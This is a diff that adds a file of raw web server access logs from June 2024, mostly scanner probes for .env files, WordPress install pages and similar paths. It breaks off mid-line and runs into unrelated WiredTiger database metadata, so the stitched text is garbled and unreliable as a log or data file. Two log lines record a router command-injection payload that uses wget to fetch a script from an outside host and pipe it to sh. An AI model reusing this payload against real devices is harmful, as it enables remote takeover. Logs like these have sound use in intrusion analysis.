@@ -1,0 +1,30 @@
+9:49 +0000] "GET /wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 329 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
+57.129.23.166 - - [26/Jun/2024:09:20:07 +0000] "GET /.env HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+57.129.23.166 - - [26/Jun/2024:09:20:07 +0000] "POST / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+4.151.38.173 - - [26/Jun/2024:09:20:19 +0000] "GET /login HTTP/1.1" 404 329 "-" "Mozilla/5.0 zgrab/0.x"
+143.110.222.166 - - [26/Jun/2024:09:24:52 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
+167.94.146.53 - - [26/Jun/2024:09:24:58 +0000] "GET / HTTP/1.1" 301 169 "-" "-"
+167.94.146.53 - - [26/Jun/2024:09:25:08 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+167.94.146.53 - - [26/Jun/2024:09:25:08 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
+167.94.146.53 - - [26/Jun/2024:09:25:11 +0000] "GET / HTTP/1.1" 200 329 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+167.94.146.53 - - [26/Jun/2024:09:25:12 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
+167.94.146.53 - - [26/Jun/2024:09:25:12 +0000] "GET /favicon.ico HTTP/1.1" 404 329 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+106.75.137.241 - - [26/Jun/2024:09:40:25 +0000] "GET /.DS_Store HTTP/1.1" 404 329 "-" "Go-http-client/1.1"
+185.191.127.212 - - [26/Jun/2024:09:47:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 169 "-" "Go-http-client/1.1"
+185.191.127.212 - - [26/Jun/2024:09:47:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 472 "http://45.56.72.236:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60)" "Go-http-client/1.1"
+80.82.77.202 - - [26/Jun/2024:09:50:00 +0000] "GET / HTTP/1.0" 301 169 "-" "Opera/9.80 (J2ME/MIDP; Opera Mini/8.0.35626/37.8918; U; en) Presto/2.12.423 Version/12.16"
+51.75.19.1 - - [26/Jun/2024:09:57:49 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+172.202.251.209 - - [26/Jun/2024:10:00:46 +0000] "MGLNDD_45.56.72.236_443" 400 157 "-" "-"
+34.78.68.58 - - [26/Jun/2024:10:10:26 +0000] "GET / HTTP/1.1" 301 169 "-" "python-requests/2.32.2"
+23.26.76.173 - - [26/Jun/2024:10:16:12 +0000] "GET /.env HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+23.26.76.173 - - [26/Jun/2024:10:16:12 +0000] "GET /.env HTTP/1.1" 400 255 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+23.26.76.173 - - [26/Jun/2024:10:16:12 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03f\x1B\xA8\xA7\xAD.\xF1K4\xCEwd\xD9\x08\xF5C\x12\xA4\xE9\x9C\xF6\x08tKD5\xD3\xD2\x0C\x9E\xE9\xFB \x17\xD9\xD7\x87\xB0\xCAG\x97\xBAD\xE1w\xA9.\x0E-\xD2Z\x9FNiF\x17f=\xA6-\x1E-5Q\x81\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 157 "-" "-"
+23.26.76.173 - - [26/Jun/2024:10:16:12 +0000] "GET /.env HTTP/1.1" 404 329 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+23.26.76.173 - - [26/Jun/2024:10:16:12 +0000] "GET /.env HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+23.26.76.173 - - [26/Jun/2024:10:16:12 +0000] "GET /.env HTTP/1.1" 400 255 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+23.26.76.173 - - [26/Jun/2024:10:16:13 +000WiredTiger version string
+WiredTiger 11.2.0: (November 10, 2022)
+WiredTiger version
+major=11,minor=2,patch=0
+file:WiredTiger.wt
+access_pattern_hint=none,allocation_size=4KB,app_metadata=,assert=(commit_timestamp=none,durable_timestamp=none,read_timestamp=none,write_timestamp=off),block_allocation=best,block_compressor=,cache_resident=false,checksum=on,collator=,columns=,dictionary=0,encryption=(keyid=,name=),format=btree,huffman_key=,huffman_value=,id=0,ignore_in_memory_cache_size=false,internal_item_max=0,internal_key_max=0,internal_key_truncate=true,internal_page_max=4KB,key_format=S,key_gap=10,leaf_item_max=0,leaf_key_max=0,leaf_page_max=32KB,leaf_value_max=0,log=(enabled=true),memory_page_image_max=0,memory_page_max=5MB,os_cache_dirty_max=0,os_cache_max=0,prefix_compression=false,prefix_compression_min=4,readonly=false,split_deepen_min_child=0,split_deepen_per_child=0,split_pct=90,tiered_object=false,tiered_storage=(auth_token=,bucket=,bucket_prefix=,cache_directory=,local_retention=300,name=,object_target_size=0),value_format=S,verbose=[],version=(major=1,minor=1),write_timestamp_usage=none,checkpoint=(WiredTigerCheckpoint.1060=(addr="018e81e404aca25c8f81e4092c5d739181e4829bac26808080e3010fc0e23fc0",order=1060,time=1719393640,size=28672,newest_start_durable_ts=0,oldest_start_ts=0,newest_txn=1298,newest_stop_durable_ts=0,newest_stop_ts=-1,newest_stop_txn=-11,prepare=0,write_gen=3180,run_write_gen=1)),checkpoint_backup_info=,checkpoint_lsn=(1,961536)
